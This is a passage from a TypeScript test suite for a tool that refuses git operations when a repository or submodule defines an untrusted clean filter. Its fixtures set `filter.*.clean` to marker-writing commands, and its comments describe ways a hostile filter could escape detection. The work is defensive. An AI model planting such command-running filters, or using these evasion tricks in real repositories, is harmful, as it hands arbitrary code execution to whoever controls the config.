    // Names the SUBMODULE and prints a command that reaches it. A plain
    // `git config --unset alias.sub` run at the superproject clears nothing
    // — `--unset` writes the repository it runs in, and the alias is in
    // `.git/modules/vendor/lib/config`, which the superproject's own config
    // never mentions. The user ran it, saw no error and met the same refusal.
    expect(stderr).toContain(submodule);
    expect(stderr).toContain(`git -C ${submodule} config --unset alias.sub`);
    expect(stderr).not.toContain('an alias this repository defined');

    // And the printed command is the one that works: run it, and the alias
    // is gone from the file the refusal came out of.
    execFileSync('git', ['-C', submodule, 'config', '--unset', 'alias.sub'], { stdio: 'ignore' });
    expect(readFileSync(join(superRepo, '.git', 'modules', 'vendor', 'lib', 'config'), 'utf-8'))
      .not.toContain('alias');
  });

  it('names the submodule in the refusal and prints an unset that actually clears it', () => {
    // The refusal used to name the SUPERPROJECT and print `git config
    // --unset filter.deep.clean`. Run there, that clears nothing: `--unset`
    // writes the repository it is run in, and the key lives in
    // `.git/modules/vendor/lib/config`, which the superproject's own config
    // never mentions. So the one instruction the user was given was a no-op,
    // and the next call refused identically.
    writeFileSync(join(submodule, '.gitattributes'), '*.bin filter=deep\n');
    git(submodule, ['add', '-A']);
    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);

    const before = getGitStatus(superRepo);

    expect(before.refusal).toContain('filter.deep.clean');
    // Which repository it is, in words and as a path.
    expect(before.refusal).toContain('submodule');
    expect(before.refusal).toContain(submodule);
    expect(before.refusal).not.toContain("this repository's own git config");
    expect(before.refusal).toContain(`git -C ${submodule} config --unset filter.deep.clean`);

    // The old instruction, run exactly as it was printed: git exits 5 with
    // nothing on stderr — "no such section" — so the user is told nothing,
    // and the refusal is unchanged.
    let status = 0;
    try {
      execFileSync('git', ['-C', superRepo, 'config', '--unset', 'filter.deep.clean'], { stdio: 'ignore' });
    } catch (error) {
      status = (error as { status?: number }).status ?? 0;
    }
    expect(status).toBe(5);
    expect(getGitStatus(superRepo).refusal).toContain('filter.deep.clean');

    // The new one, run exactly as it is printed.
    git(submodule, ['config', '--unset', 'filter.deep.clean']);
    const after = getGitStatus(superRepo);

    expect(after.refusal).toBeUndefined();
    expect(after.branch).toBeTruthy();
    expect(fired()).toEqual([]);
  });

  it('leaves a known-safe submodule filter alone, as it would at the superproject', () => {
    // The allowlist is the same list wherever the filter came from: a
    // submodule that is itself a git-lfs repository must not take the
    // superproject's status line down with it.
    git(submodule, ['config', 'filter.lfs.clean', 'git-lfs clean -- %f']);

    const status = getGitStatus(superRepo);

    expect(status.error).toBeUndefined();
    expect(status.branch).toBeTruthy();
  });

  it('refuses rather than scan only some of a superproject with too many submodules', () => {
    // The cap is a bound on a tree the REPOSITORY owns, so the answer past it
    // has to be "no" rather than "we checked some of them" — the partial scan
    // is a fail-open dressed as a limit. The submodules are declared by hand,
    // because what the enumeration reads is `submodule.<name>.url` plus the
    // git dir the name maps to, and 2049 real `git submodule add` calls would
    // take minutes to prove the same branch.
    const modules = join(superRepo, '.git', 'modules');
    let declared = '';
    for (let i = 0; i < MAX_SUBMODULE_CONFIGS + 1; i++) {
      mkdirSync(join(modules, `m${i}`), { recursive: true });
      writeFileSync(join(modules, `m${i}`, 'config'), '[core]\n\trepositoryformatversion = 0\n');
      declared += `[submodule "m${i}"]\n\turl = ../lib\n\tactive = true\n`;
    }
    appendFileSync(join(superRepo, '.git', 'config'), declared);

    // The message has to name something the user can change. The cap used to
    // be 512 with a sentence that offered nothing at all, so a superproject
    // past it was simply refused forever.
    expect(() => hardenedGitEnv({ cwd: superRepo }))
      .toThrow(new RegExp(`more than ${MAX_SUBMODULE_CONFIGS} initialised submodules`));
    expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/git submodule deinit/);
    expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/git -C <path>/);
  });

  it('is a cap far past any real superproject, so it is a backstop and not a wall', () => {
    // The other half of raising it: the number has to be one nobody reaches
    // by having a lot of submodules. The largest superprojects published
    // anywhere are in the low hundreds.
    expect(MAX_SUBMODULE_CONFIGS).toBeGreaterThanOrEqual(2048);
  });

  /**
   * Count the git children one hardenedGitEnv() call spawns, by putting a
   * shim named `git` in front of the real one on the PATH it hands them.
   *
   * This replaces a wall-clock budget, which was a bad guard twice over: it
   * could not say WHICH property broke, and the number it allowed (60ms for
   * one ~7ms child) was wide enough for a second process to hide in. The
   * shim answers the actual question — how many, and which subcommands.
   */
  function gitChildrenOf(cwd: string): string[] {
    const shimDir = join(base, `shim-${Math.random().toString(36).slice(2)}`);
    const log = join(shimDir, 'calls.log');
    mkdirSync(shimDir);
    const realGit = execFileSync('sh', ['-c', 'command -v git'], { encoding: 'utf-8' }).trim();
    writeFileSync(join(shimDir, 'git'), `#!/bin/sh\nprintf '%s\\n' "$*" >> "${log}"\nexec ${realGit} "$@"\n`);
    chmodSync(join(shimDir, 'git'), 0o755);
    writeFileSync(log, '');

    hardenedGitEnv({ cwd, base: { ...process.env, PATH: `${shimDir}:${process.env.PATH ?? ''}` } });

    // The subcommand as a whole word, so the `-c include.path=…/config`
    // arguments of the submodule read are not mistaken for one.
    return readFileSync(log, 'utf-8')
      .split('\n')
      .filter(Boolean)
      .map(line => ['ls-files', 'config', 'rev-parse'].find(cmd => new RegExp(`(^| )${cmd}( |$)`).test(line)) ?? line);
  }

  it('reads the index even in a repository that declares no submodules', () => {
    // The cost guard, and it changed sides this round. There used to be a
    // gate that skipped the index listing when nothing DECLARED a submodule —
    // no `submodule.*` config, no `.git/modules`, no `.gitmodules` — and a
    // gitlink added with a plain `git add` leaves none of the three while git
    // still descends into it. So the listing runs here too, and what the
    // guard pins now is the price: exactly two children, never one per
    // anything. Measured, that is 7.0ms → 13.6ms at this repository's size.
    const plain = join(base, 'lib');
    expect(existsSync(join(plain, '.git', 'modules'))).toBe(false);
    expect(existsSync(join(plain, '.gitmodules'))).toBe(false);

    expect(gitChildrenOf(plain).sort()).toEqual(['config', 'ls-files']);
  });

  it('stays at one `git config --list` for ALL the submodules, however many there are', () => {
    // The property that makes this affordable: the configs are read through
    // one `-c include.path=…` child whatever the count, so the cost is flat.
    // A child per submodule measured 342ms on a fifty-submodule fixture — on
    // every status refresh. The `ls-files` beside it is the index listing
    // that finds the submodules, and it is also one, not one per submodule.
    expect(gitChildrenOf(superRepo).sort()).toEqual(['config', 'config', 'ls-files']);

    // Nine more submodules, sharing the one library, and the same two reads.
    for (let i = 0; i < 9; i++) {
      git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', `vendor/extra${i}`]);
    }

    expect(gitChildrenOf(superRepo).sort()).toEqual(['config', 'config', 'ls-files']);
  });
});

/**
 * The submodule layouts the old `.git/modules` directory walk did not see.
 *
 * The walk was the wrong primitive: it asked the filesystem what looked like
 * a submodule git directory instead of asking git which submodules there
 * are. Three real layouts escaped it, and each one is reproduced below by
 * first running a plain `git status` at the SUPERPROJECT and watching the
 * submodule's clean filter fire — the repository is ordinary, the config is
 * the submodule's own, and the superproject's `.git/config` is spotless.
 *
 * The fourth, a symlinked `.git/modules/<name>`, was skipped rather than
 * missed: `isDirectory()` is false for a symlink, so the walk stepped over
 * a git directory git follows without blinking.
 */
describe.skipIf(!hasGit || !posix)('submodule layouts the .git/modules walk missed', () => {
  isolateGitConfig();
  let lib: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-submodule-shapes-')));
    markers = join(base, 'markers');
    mkdirSync(markers);

    lib = join(base, 'lib');
    git(base, ['init', '-q', 'lib']);
    git(lib, ['config', 'user.email', 'test@test.com']);
    git(lib, ['config', 'user.name', 'Test User']);
    writeFileSync(join(lib, '.gitattributes'), '*.bin filter=deep\n');
    writeFileSync(join(lib, 'notes.bin'), 'before\n');
    git(lib, ['add', '-A']);
    git(lib, ['commit', '-qm', 'initial']);
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  /** An empty superproject, ready for a submodule in whichever shape. */
  function makeSuper(): string {
    const superRepo = join(base, 'super');
    git(base, ['init', '-q', 'super']);
    git(superRepo, ['config', 'user.email', 'test@test.com']);
    git(superRepo, ['config', 'user.name', 'Test User']);
    return superRepo;
  }

  /**
   * Arm the submodule's own clean filter, make the tracked file dirty, and
   * assert that a PLAIN `git status` at the superproject runs it.
   *
   * Every test here needs that assertion, because "the marker stayed cold"
   * is only worth something once the marker is known to be reachable: a
   * layout the fix does not scan but git never descends into would pass a
   * one-sided test while proving nothing.
   */
  function armAndProveReachable(superRepo: string, submodule: string): void {
    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
    // Same length as the original, so git cannot skip the content comparison
    // that runs the clean filter.
    writeFileSync(join(submodule, 'notes.bin'), 'after.\n');

    git(superRepo, ['status', '--porcelain']);
    expect(fired()).toEqual(['sub-clean']);
    rmSync(join(markers, 'sub-clean'));
  }

  it('reads the config of a submodule whose git directory is embedded in the working tree', () => {
    // `git submodule add` over a path that is ALREADY a checkout answers
    // "Adding existing repo at '<path>' to the index" and leaves the embedded
    // `.git` directory where it is — so `.git/modules` is never created and
    // the walk had nothing to walk. A hand-over of a prepared directory tree
    // is all it takes to arrive in this shape.
    const superRepo = makeSuper();
    git(superRepo, ['clone', '-q', lib, 'vendor/lib']);
    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
    git(superRepo, ['commit', '-qm', 'add submodule']);
    const submodule = join(superRepo, 'vendor', 'lib');
    expect(existsSync(join(superRepo, '.git', 'modules'))).toBe(false);
    expect(statSync(join(submodule, '.git')).isDirectory()).toBe(true);

    armAndProveReachable(superRepo, submodule);
    const status = getGitStatus(superRepo);

    expect(fired()).toEqual([]);
    expect(status.refusal).toContain('filter.deep.clean');
    expect(status.branch).toBeUndefined();
  });

  it('does NOT reach the same shape one level down, which is the gap this pins', () => {
    // The shape git.ts names under "WHAT IS STILL NOT REACHED": a submodule
    // OF a submodule whose git directory is embedded in its parent's working
    // tree. The enumeration finds `vendor/mid` from the superproject's index
    // and reads its config, but the only thing that config gives for `deep`
    // is a NAME, which maps to `<mid's git dir>/modules/deep` — and this
    // checkout's `deep` keeps its git directory in mid's working tree
    // instead. Reaching it means reading mid's own index, which is one more
    // child process per submodule, and that is a trade for a release rather
    // than for a hotfix.
    //
    // So this test does not assert the fix; it asserts the GAP, with a live
    // control that the gap is real and reachable. If a later round widens the
    // scan, this test goes red and says so, which is the point of pinning it.
    const superRepo = makeSuper();
    const mid = join(base, 'mid');
    git(base, ['init', '-q', 'mid']);
    git(mid, ['config', 'user.email', 'test@test.com']);
    git(mid, ['config', 'user.name', 'Test User']);
    writeFileSync(join(mid, 'mid.txt'), 'x\n');
    git(mid, ['add', '-A']);
    git(mid, ['commit', '-qm', 'initial']);
    git(mid, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'deep']);
    git(mid, ['commit', '-qm', 'add deep']);

    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../mid', 'vendor/mid']);
    git(superRepo, ['commit', '-qm', 'add mid']);

    // `git submodule add` does not initialise a submodule's own submodules,
    // so `deep` arrives as an empty directory. Filling it with a clone is how
    // a hand-prepared tree arrives — and it is the embedded shape, a real
    // `.git` DIRECTORY sitting inside mid's working tree.
    const deep = join(superRepo, 'vendor', 'mid', 'deep');
    rmSync(deep, { recursive: true, force: true });
    git(base, ['clone', '-q', lib, deep]);
    expect(statSync(join(deep, '.git')).isDirectory()).toBe(true);

    // The control: git really does descend two levels and really does run
    // the innermost checkout's clean filter on the SUPERPROJECT's own
    // `git status --porcelain`.
    armAndProveReachable(superRepo, deep);

    const status = getGitStatus(superRepo);

    // Current behaviour, stated out loud: the call goes through, and the
    // filter git would have run is one Codeep never saw.
    expect(status.refusal).toBeUndefined();
    expect(status.branch).toBeTruthy();
    // The one level up IS covered, so the gap is the depth and not the shape.
    git(join(superRepo, 'vendor', 'mid'), ['config', 'filter.deep.clean', `${trap('mid-clean')}; cat`]);
    expect(getGitStatus(superRepo).refusal).toContain('filter.deep.clean');
  });

  it('reads the config of a submodule whose .git file points outside .git/modules', () => {
    // Absorbed submodules point at `.git/modules/<name>`, and nothing makes
    // them: a `.git` file is one line of text, and git follows wherever it
    // points. The walk only ever looked under `.git/modules`.
    const superRepo = makeSuper();
    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
    git(superRepo, ['commit', '-qm', 'add submodule']);
    const submodule = join(superRepo, 'vendor', 'lib');
    const moved = join(superRepo, '.git', 'elsewhere');
    renameSync(join(superRepo, '.git', 'modules', 'vendor', 'lib'), moved);
    writeFileSync(join(submodule, '.git'), 'gitdir: ../../.git/elsewhere\n');
    appendFileSync(join(moved, 'config'), `[core]\n\tworktree = ${submodule}\n`);

    armAndProveReachable(superRepo, submodule);
    const status = getGitStatus(superRepo);

    expect(fired()).toEqual([]);
    expect(status.refusal).toContain('filter.deep.clean');
  });

  it('is not fooled by a decoy config planted above a slashed submodule name', () => {
    // One `touch` is the whole attack. A submodule named `vendor/lib` lands
    // at `.git/modules/vendor/lib/config`, and the walk descended through
    // `.git/modules/vendor` only while that directory had no `config` of its
    // own — so an empty file there made it stop, report the decoy and never
    // reach the real one. A name is a direct lookup, so nothing planted
    // alongside it hides it.
    const superRepo = makeSuper();
    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
    git(superRepo, ['commit', '-qm', 'add submodule']);
    const submodule = join(superRepo, 'vendor', 'lib');
    writeFileSync(join(superRepo, '.git', 'modules', 'vendor', 'config'), '[core]\n\trepositoryformatversion = 0\n');

    armAndProveReachable(superRepo, submodule);
    const status = getGitStatus(superRepo);

    expect(fired()).toEqual([]);
    expect(status.refusal).toContain('filter.deep.clean');
  });

  it('follows a symlinked .git/modules entry instead of stepping over it', () => {
    // `Dirent.isDirectory()` is false for a symlink, so the walk skipped one
    // — and skipping is the one answer a symlinked git directory must not
    // get, because git follows it. Reading through it is what git does, so
    // that is what this does; refusing would break a checkout somebody moved
    // onto another disk for perfectly ordinary reasons.
    const superRepo = makeSuper();
    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
    git(superRepo, ['commit', '-qm', 'add submodule']);
    const submodule = join(superRepo, 'vendor', 'lib');
    const inside = join(superRepo, '.git', 'modules', 'vendor', 'lib');
    const outside = join(base, 'moved-git-dir');
    renameSync(inside, outside);
    symlinkSync(outside, inside);
    appendFileSync(join(outside, 'config'), `[core]\n\tworktree = ${submodule}\n`);

    armAndProveReachable(superRepo, submodule);
    const status = getGitStatus(superRepo);

    expect(fired()).toEqual([]);
    expect(status.refusal).toContain('filter.deep.clean');
  });

  it('reads a gitlink that no .gitmodules and no submodule.* config declares', () => {
    // The gate in front of the index enumeration: it ran `git ls-files` only
    // when the config named a submodule, or `.git/modules` existed, or the
    // working tree had a `.gitmodules`. A gitlink added with a plain `git
    // add` leaves NONE of those three, so the enumeration the whole pass was
    // rebuilt around never ran and the submodule went unscanned — while git
    // descended into it all the same. One `git clone` and one `git add` is
    // the entire setup.
    const superRepo = makeSuper();
    git(superRepo, ['clone', '-q', lib, 'vendor/lib']);
    git(superRepo, ['add', 'vendor/lib']);
    git(superRepo, ['commit', '-qm', 'gitlink with nothing declaring it']);
    const submodule = join(superRepo, 'vendor', 'lib');
    // The three signals the gate looked for, all absent.
    expect(existsSync(join(superRepo, '.gitmodules'))).toBe(false);
    expect(existsSync(join(superRepo, '.git', 'modules'))).toBe(false);
    expect(git(superRepo, ['config', '--list', '--local'])).not.toMatch(/^submodule\./m);

    armAndProveReachable(superRepo, submodule);
    const status = getGitStatus(superRepo);

    expect(fired()).toEqual([]);
    expect(status.refusal).toContain('filter.deep.clean');
    expect(status.branch).toBeUndefined();
  });

  it('says nothing about submodules in a repository git will not serve at all', () => {
    // The index listing now runs everywhere, which means it also runs in the
    // repositories git refuses to touch. `core.repositoryformatversion = 99`
    // is the sharp one: `git config --list` only WARNS there and still exits
    // 0, so the scan gets as far as the index and then meets a git that will
    // not read one. Turning that into a hardening refusal would be wrong
    // twice — the real call cannot run there either, so there is nothing to
    // refuse over, and the refusal would talk about a submodule scan in a
    // repository that has no submodules and no working git.
    const superRepo = makeSuper();
    git(superRepo, ['config', 'core.repositoryformatversion', '99']);

    expect(() => hardenedGitEnv({ cwd: superRepo })).not.toThrow();
    // Not vacuous: git really does decline every command in there, which is
    // the whole reason there is nothing left to protect.
    expect(() => git(superRepo, ['status', '--porcelain'])).toThrow();
  });

  it("reads a submodule's config.worktree, which git honours as its own scope", () => {
    // `<gitdir>/config.worktree` ships inside the git directory exactly as
    // `config` does, and git reads it as scope `worktree` once the repository
    // sets `extensions.worktreeConfig`. The pass read only `config`, so a
    // `filter.<d>.clean` written with `git config --worktree` inside a
    // submodule survived the entire scan while the superproject's own plain
    // `git status` ran it (reproduced, git 2.54).
    const superRepo = makeSuper();
    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
    git(superRepo, ['commit', '-qm', 'add submodule']);
    const submodule = join(superRepo, 'vendor', 'lib');
    git(submodule, ['config', 'extensions.worktreeConfig', 'true']);
    git(submodule, ['config', '--worktree', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
    // The key really is in the other file, so this cannot pass by accident.
    const gitDir = join(superRepo, '.git', 'modules', 'vendor', 'lib');
    expect(readFileSync(join(gitDir, 'config.worktree'), 'utf-8')).toContain('clean');
    expect(readFileSync(join(gitDir, 'config'), 'utf-8')).not.toContain('clean');
    writeFileSync(join(submodule, 'notes.bin'), 'after.\n');
    git(superRepo, ['status', '--porcelain']);
    expect(fired()).toEqual(['sub-clean']);
    rmSync(join(markers, 'sub-clean'));

    const status = getGitStatus(superRepo);

    expect(fired()).toEqual([]);
    expect(status.refusal).toContain('filter.deep.clean');
    // And the `--unset` it prints reaches the file the key is actually in: a
    // plain `git config --unset` writes the LOCAL config, exits 5 and clears
    // nothing here (verified, git 2.54).
    expect(status.refusal).toContain(`git -C ${submodule} config --worktree --unset filter.deep.clean`);
  });

  it('refuses instead of treating an unreadable submodule git dir as "no submodule here"', () => {
    // The bounds have to fail CLOSED like the count cap does. This one used
    // to be an `existsSync`, which answers false for a file it has no
    // permission to look at — so one `chmod 000` turned a submodule carrying
    // a hostile filter into a repository with no submodules at all, in
    // silence, while git read the same file without trouble.
    const superRepo = makeSuper();
    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
    git(superRepo, ['commit', '-qm', 'add submodule']);
    const gitDir = join(superRepo, '.git', 'modules', 'vendor', 'lib');
    chmodSync(gitDir, 0o000);

    try {
      expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/could not be reached/);
    } finally {
      chmodSync(gitDir, 0o755);
    }
  });

  it('refuses instead of scanning only the levels it reached of a deeply nested tree', () => {
    // The depth guard used to `return`, which made "nested one level too
    // deep" mean "no more submodules down there" — the same fail-open the
    // count cap was written to avoid, sitting right next to it. The levels
    // are declared by hand: what the enumeration follows is
    // `submodule.<name>.url` plus the `modules/<name>` each name maps to,
    // and seventeen real `git submodule add` calls prove the same branch far
    // more slowly.
    const superRepo = makeSuper();
    let dir = join(superRepo, '.git');
    appendFileSync(join(dir, 'config'), '[submodule "n0"]\n\turl = ../lib\n\tactive = true\n');
    for (let level = 0; level < 18; level++) {
      dir = join(dir, 'modules', `n${level}`);
      mkdirSync(dir, { recursive: true });
      writeFileSync(
        join(dir, 'config'),
        `[core]\n\trepositoryformatversion = 0\n[submodule "n${level + 1}"]\n\turl = ../lib\n\tactive = true\n`
      );
    }

    expect(() => hardenedGitEnv({ cwd: superRepo })).toThrow(/nested more than 16 levels deep/);
  });
});

/**
 * A content filter that routes nothing in this checkout today.
 *
 * The previous round relaxed the filter rule so that it refused only when
 * some attributes file said `filter=<driver>`, to spare the ordinary
 * repository still carrying a leftover `filter.nbstripout.*`. That answer
 * needed a second copy of git's attribute resolution to be right, and it was
 * not: `.git/info/attributes` in a linked worktree, `attr.tree`,
 * `--attr-source` and a path that is in the index but not on disk all route
 * paths the copy never looked at, and every one of them reads back as "inert"
 * — which hands the repository arbitrary execution.
 *
 * So the relaxation is reverted, and these tests pin the revert: the refusal
 * is flat again. The one thing the message owes the leftover-config user is a
 * sentence explaining why a driver they can see nothing using still stops the
 * call, and the last test here asserts it is there.
 */
describe.skipIf(!hasGit || !posix)('a content filter with nothing routed at it today', () => {
  isolateGitConfig();
  let repoDir: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-unrouted-filter-')));
    markers = join(base, 'markers');
    repoDir = join(base, 'repo');
    mkdirSync(markers);

    git(base, ['init', '-q', 'repo']);
    git(repoDir, ['config', 'user.email', 'test@test.com']);
    git(repoDir, ['config', 'user.name', 'Test User']);
    writeFileSync(join(repoDir, 'README.md'), 'no notebooks here\n');
    git(repoDir, ['add', '-A']);
    git(repoDir, ['commit', '-qm', 'initial']);
    // What `nbstripout --install` leaves behind, in the spelling that is NOT
    // on the allowlist (the installer writes an absolute interpreter path on
    // a modern install, and an absolute path is the machine's rather than a
    // string this repository can pin). No `.gitattributes` anywhere names it.
    git(repoDir, ['config', 'filter.nbstripout.clean', `${trap('nbstripout')}; cat`]);
    writeFileSync(join(repoDir, 'notes.txt'), 'changed\n');
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('refuses although no .gitattributes routes a path at the driver', () => {
    const status = getGitStatus(repoDir);

    expect(status.refusal).toContain('filter.nbstripout.clean');
    expect(status.error).toBe(status.refusal);
    expect(fired()).toEqual([]);
  });

  it('refuses the calls the user actually makes, not only the status line', () => {
    expect(stageAllResult(repoDir).error).toContain('filter.nbstripout.clean');
    expect(getChangedFilesResult(repoDir).error).toContain('filter.nbstripout.clean');
    expect(getGitDiff(false, repoDir).error).toContain('filter.nbstripout.clean');
    expect(fired()).toEqual([]);
  });

  it('refuses when the routing would come from a tree the working tree does not show', () => {
    // `attr.tree` is one of the sources the routing check could not see, and
    // the reason it could not be made sound cheaply: the attributes live in a
    // tree object, so no file on disk says `filter=nbstripout` and the old
    // check answered "inert" — while git happily routed `*.txt` at the
    // driver. Committed on a side branch and left out of the working tree, so
    // this is exactly the shape the check missed.
    writeFileSync(join(repoDir, '.gitattributes'), '*.txt filter=nbstripout\n');
    git(repoDir, ['add', '.gitattributes']);
    git(repoDir, ['commit', '-qm', 'attributes on a side tree']);
    const tree = git(repoDir, ['rev-parse', 'HEAD^{tree}']).trim();
    rmSync(join(repoDir, '.gitattributes'));
    git(repoDir, ['rm', '-q', '--cached', '.gitattributes']);
    git(repoDir, ['commit', '-qm', 'take the attributes back out']);

    // Nothing on disk and nothing in the index routes anything now — and git
    // still runs the filter when pointed at that tree.
    expect(getGitStatus(repoDir).refusal).toContain('filter.nbstripout.clean');
    expect(tree).toMatch(/^[0-9a-f]{40}$/);
    expect(fired()).toEqual([]);
  });

  it('refuses over a submodule driver that nothing in the submodule routes either', () => {
    const lib = join(base, 'lib');
    git(base, ['init', '-q', 'lib']);
    git(lib, ['config', 'user.email', 'test@test.com']);
    git(lib, ['config', 'user.name', 'Test User']);
    writeFileSync(join(lib, 'plain.txt'), 'before\n');
    git(lib, ['add', '-A']);
    git(lib, ['commit', '-qm', 'initial']);
    git(repoDir, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
    git(repoDir, ['commit', '-qm', 'add submodule']);
    git(repoDir, ['config', '--unset', 'filter.nbstripout.clean']);
    git(join(repoDir, 'vendor', 'lib'), ['config', 'filter.leftover.clean', `${trap('sub-clean')}; cat`]);

    const status = getGitStatus(repoDir);

    expect(status.refusal).toContain('filter.leftover.clean');
    // And it still points at the submodule rather than at the superproject,
    // where `git config --unset` would silently clear nothing.
    expect(status.refusal).toContain(join(repoDir, 'vendor', 'lib'));
    expect(fired()).toEqual([]);
  });

  it('says in the message why a driver nothing appears to use is refused anyway', () => {
    // Without this sentence the leftover-config user reads a refusal naming a
    // driver, greps their tree for it, finds nothing, and concludes Codeep is
    // broken. The message has to carry the reason and the fix, because it is
    // the only thing they are shown.
    const refusal = getGitStatus(repoDir).refusal ?? '';

    expect(refusal).toMatch(/even if nothing routes a path at "nbstripout"/);
    expect(refusal).toContain('git config --unset filter.nbstripout.clean');
    // And it still warns off the `required false` workaround, which is the
    // first thing a search for "clean filter failed" suggests.
    expect(refusal).toContain('filter.nbstripout.required false');
  });

  it('still leaves the well-known integrations running', () => {
    // The revert is about the UNKNOWN command lines. A git-lfs repository
    // must keep working, or the flat refusal is a wall in front of every
    // repository that ever ran `git lfs install --local`.
    git(repoDir, ['config', '--unset', 'filter.nbstripout.clean']);
    git(repoDir, ['config', 'filter.lfs.clean', 'git-lfs clean -- %f']);
    git(repoDir, ['config', 'filter.lfs.process', 'git-lfs filter-process']);

    const status = getGitStatus(repoDir);

    expect(status.refusal).toBeUndefined();
    expect(status.branch).toBeTruthy();
    expect(status.hasChanges).toBe(true);
  });
});

/**
 * A brand-new repository, which is where the refusal machinery meets the
 * user who has done nothing wrong.
 *
 * `git init` and one agent run is the first thing that happens in a new
 * project, and `git rev-parse --abbrev-ref HEAD` answers `fatal: ambiguous
 * argument 'HEAD'` there (git 2.54) because there is no commit for HEAD to
 * name. That is an ordinary git failure and it fills `error` — so anything
 * that reads `error` and puts it in front of the user is showing raw git
 * plumbing to somebody who has just started.
 */
describe.skipIf(!hasGit)('a repository with no commits yet', () => {
  isolateGitConfig();
  let fresh: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-fresh-')));
    fresh = join(base, 'project');
    mkdirSync(fresh);
    git(base, ['init', '-q', 'project']);
    git(fresh, ['config', 'user.email', 'test@test.com']);
    git(fresh, ['config', 'user.name', 'Test User']);
    writeFileSync(join(fresh, 'app.ts', ), 'export const x = 1;\n');
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('fills `error` but NOT `refusal`, so nothing tells the user to remove a config key', () => {
    const status = getGitStatus(fresh);

    expect(status.isRepo).toBe(true);
    // The fixture is the real thing, not a contrivance: this is git's own
    // message for a repository with no commit.
    expect(status.error).toMatch(/ambiguous argument 'HEAD'|unknown revision/);
    expect(status.refusal).toBeUndefined();
  });

  it('still reports the changes, so the branch read failing does not cost the status', () => {
    // The branch read threw and the outer catch took the rest of the function
    // with it, so `hasChanges` came back undefined in every brand-new
    // repository. Only the branch is unknown here; the working tree is
    // perfectly readable and `git status --porcelain` answers for it.
    const status = getGitStatus(fresh);

    expect(status.branch).toBeUndefined();
    expect(status.hasChanges).toBe(true);
    expect(getChangedFiles(fresh)).toContain('app.ts');
  });

  it('autoCommitAgentChanges makes the first commit instead of reporting no changes', () => {
    // The whole point of the fix. `git init` plus one agent run is the first
    // thing that happens in a new project, and the auto-commit read
    // `hasChanges` — which the aborted status left undefined — so it answered
    // "No changes detected by git" over a working tree full of the files the
    // agent had just written, and never committed once until the user made a
    // first commit by hand.
    const result = autoCommitAgentChanges(
      'add the entrypoint',
      [{ type: 'write', target: 'app.ts', result: 'success', timestamp: Date.now() }],
      fresh
    );

    expect(result.error).toBeUndefined();
    expect(result.success).toBe(true);
    expect(result.hash).toMatch(/^[0-9a-f]{7,}$/);
    // The commit is real, and it carries the file.
    expect(git(fresh, ['show', '--name-only', '--format=', 'HEAD']).trim()).toBe('app.ts');
  });

  it('keeps the ordinary sentence when there is genuinely nothing to commit', () => {
    // The other half: reading `refusal` rather than `error` is what stops the
    // brand-new repository being told to remove a config key it does not
    // have. With nothing in the working tree, `hasChanges` is false and the
    // sentence is the plain one.
    rmSync(join(fresh, 'app.ts'));

    const result = autoCommitAgentChanges(
      'add the entrypoint',
      [{ type: 'write', target: 'app.ts', result: 'success', timestamp: Date.now() }],
      fresh
    );

    expect(result.success).toBe(false);
    expect(result.error).toBe('No changes detected by git');
    expect(result.error).not.toMatch(/fatal:|ambiguous argument|rev-parse|git config --unset/);
  });
});

/**
 * `<cwd>/.git` is a DIRECTORY — which the layout's fast path took as proof
 * that `cwd` is the repository root, and it is not proof of anything. Any
 * directory can be called `.git`, and a half-built or half-deleted git
 * directory has the same shape.
 *
 * What that cost is not cosmetic. The layout decides where the submodule
 * enumeration looks: `<cwd>/.git/modules` for the names, and `cwd` as the
 * root the index's gitlink paths are resolved against. Both were wrong here,
 * so every gitlink landed on a directory that is not there and the whole
 * enumeration came back empty — silently, while git, run from that same
 * directory, walked up to the real repository and ran the submodule's
 * `filter.<d>.clean` on a plain `git status`. Both suites below arm exactly
 * that filter and prove it fires before asserting that Codeep refuses.
 */
describe.skipIf(!hasGit || !posix)('a .git directory that is not a repository', () => {
  isolateGitConfig();
  let superRepo: string;

  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-layout-')));
    markers = join(base, 'markers');
    mkdirSync(markers);

    const lib = join(base, 'lib');
    git(base, ['init', '-q', 'lib']);
    git(lib, ['config', 'user.email', 'test@test.com']);
    git(lib, ['config', 'user.name', 'Test User']);
    writeFileSync(join(lib, '.gitattributes'), '*.bin filter=deep\n');
    writeFileSync(join(lib, 'notes.bin'), 'before\n');
    git(lib, ['add', '-A']);
    git(lib, ['commit', '-qm', 'initial']);

    superRepo = join(base, 'super');
    git(base, ['init', '-q', 'super']);
    git(superRepo, ['config', 'user.email', 'test@test.com']);
    git(superRepo, ['config', 'user.name', 'Test User']);
    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
